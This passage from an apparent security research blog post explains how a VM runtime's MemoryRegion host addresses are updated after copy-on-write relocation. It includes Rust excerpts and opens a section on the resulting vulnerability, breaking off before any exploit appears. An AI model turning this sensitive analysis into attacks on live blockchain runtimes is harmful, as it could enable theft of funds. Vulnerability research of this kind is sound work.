<li class="my-2"><strong class="font-semibold text-white">Compare Buffer Addresses</strong>: Check if the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>&#x27;s current <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> matches the account&#x27;s actual data buffer address in <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code>. If they differ, a relocation occurred during CoW operations.</li>
<li class="my-2"><strong class="font-semibold text-white">Update the Mapping</strong>: Replace the <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code>&#x27;s <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code> with the new buffer address from <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">AccountSharedData</code>, ensuring future VM memory accesses resolve to the correct location.</li>
<li class="my-2"><strong class="font-semibold text-white">Complete the Update</strong>: After updating <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">host_addr</code>, when the parent program accesses memory at the same virtual address, it will now correctly resolve to the relocated buffer location.</li>
</ol>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed"><span class="block my-8"><img class="mx-auto" src="/blog/2025_06_27/memoryregion_update.png" alt="MemoryRegion Update"/></span></p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">This mechanism relies on an assumption: that <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">vm_data_addr</code> accurately identifies the correct <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion</code> to update.</p>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">The code of searching for a region containing some specific <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">vm_addr</code> is shown here</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">impl</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f8c555">UnalignedMemoryMapping</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">find_region</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span> cache</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#f8c555">MappingCache</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Option</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryRegion</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>        </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>index</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> cache</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">find</span><span class="token token" style="color:#ccc">(</span><span>vm_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>            </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>        </span><span class="token token" style="color:#ccc">}</span><span> </span><span class="token token" style="color:#cc99cd">else</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#cc99cd">mut</span><span> index </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>            </span><span class="token token" style="color:#999">// region_addresses is eytzinger ordered array of MemoryRegions, so we</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>            </span><span class="token token" style="color:#999">// do a binary search here </span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>            </span><span class="token token" style="color:#cc99cd">while</span><span> index </span><span class="token token" style="color:#67cdcc">&lt;=</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>region_addresses</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>                </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span>                </span><span class="token token" style="color:#999">// we start the search at index=1 and in the loop condition check</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>                </span><span class="token token" style="color:#999">// for index &lt;= len, so bound checks can be avoided</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>                index </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">(</span><span>index </span><span class="token token" style="color:#67cdcc">&lt;&lt;</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>                    </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>region_addresses</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_unchecked</span><span class="token token" style="color:#ccc">(</span><span>index </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">&lt;=</span><span> vm_addr </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span>                        </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">usize</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span><span>            index </span><span class="token token" style="color:#67cdcc">&gt;&gt;=</span><span> index</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">trailing_zeros</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span>            </span><span class="token token" style="color:#cc99cd">if</span><span> index </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f08d49">0</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span><span>                </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">None</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span><span>            </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span><span>            </span><span class="token token" style="color:#999">// we check for index==0 above, and by construction if we get here index</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">24</span><span>            </span><span class="token token" style="color:#999">// must be contained in region</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">25</span><span>            </span><span class="token token" style="color:#cc99cd">let</span><span> region </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>regions</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_unchecked</span><span class="token token" style="color:#ccc">(</span><span>index </span><span class="token token" style="color:#67cdcc">-</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">26</span><span>            </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">27</span><span>            </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">28</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">29</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">30</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">31</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></div></pre>
<h2 class="text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow">The Vulnerability</h2>
<p class="text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed">So how are <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">MemoryRegion.host_addr</code> updates implemented? The <code class="whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono" style="background:rgba(255, 255, 255, 0.1);font-size:0.9em">update_caller_account()</code> function needs to detect when account data has been relocated due to CoW operations and update the corresponding memory regions.</p>
<pre><div class="relative my-6 border border-white/10 bg-black/60"><div class="absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase">:: <!-- -->RUST</div><div class="rounded-sm !bg-transparent !m-0" style="color:#ccc;background:#0a0a0a;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border:1px solid rgba(255, 255, 255, 0.15);box-shadow:0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)"><code class="language-rust" style="white-space:pre;color:#e0e0e0;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">1</span><span class="token token" style="color:#cc99cd">impl</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#f8c555">UnalignedMemoryMapping</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token lifetime-annotation" style="color:#f8c555">&#x27;a</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">2</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">region</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">4</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">5</span><span>        access_type</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">6</span><span>        vm_addr</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">7</span><span>    </span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">Result</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">MemoryRegion</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f8c555">Box</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">dyn</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#e2777a">error</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Error</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">8</span><span>        </span><span class="token token" style="color:#999">// Safety:</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">9</span><span>        </span><span class="token token" style="color:#999">// &amp;mut references to the mapping cache are only created internally from methods that do not</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">10</span><span>        </span><span class="token token" style="color:#999">// invoke each other. UnalignedMemoryMapping is !Sync, so the cache reference below is</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">11</span><span>        </span><span class="token token" style="color:#999">// guaranteed to be unique.</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">12</span><span>        </span><span class="token token" style="color:#cc99cd">let</span><span> cache </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">unsafe</span><span> </span><span class="token token" style="color:#ccc">{</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cache</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">13</span><span>        </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">let</span><span> </span><span class="token token" style="color:#f8c555">Some</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">find_region</span><span class="token token" style="color:#ccc">(</span><span>cache</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">14</span><span>            </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">.</span><span>vm_addr</span><span class="token token" style="color:#ccc">..</span><span>region</span><span class="token token" style="color:#ccc">.</span><span>vm_addr_end</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">contains</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#67cdcc">&amp;</span><span>vm_addr</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">15</span><span>                </span><span class="token token" style="color:#67cdcc">&amp;&amp;</span><span> </span><span class="token token" style="color:#ccc">(</span><span>access_type </span><span class="token token" style="color:#67cdcc">==</span><span> </span><span class="token token" style="color:#f8c555">AccessType</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Load</span><span> </span><span class="token token" style="color:#67cdcc">||</span><span> </span><span class="token token" style="color:#f08d49">ensure_writable_region</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>cow_cb</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">16</span><span>            </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">17</span><span>                </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span>region</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">18</span><span>            </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">19</span><span>        </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">20</span><span>        </span><span class="token token" style="color:#f8c555">Err</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">generate_access_violation</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">.</span><span>config</span><span class="token token" style="color:#ccc">,</span><span> access_type</span><span class="token token" style="color:#ccc">,</span><span> vm_addr</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">unwrap_err</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">21</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">22</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">23</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999;border-right:1px solid rgba(255,255,255,0.1);margin-right:1em">24</span>
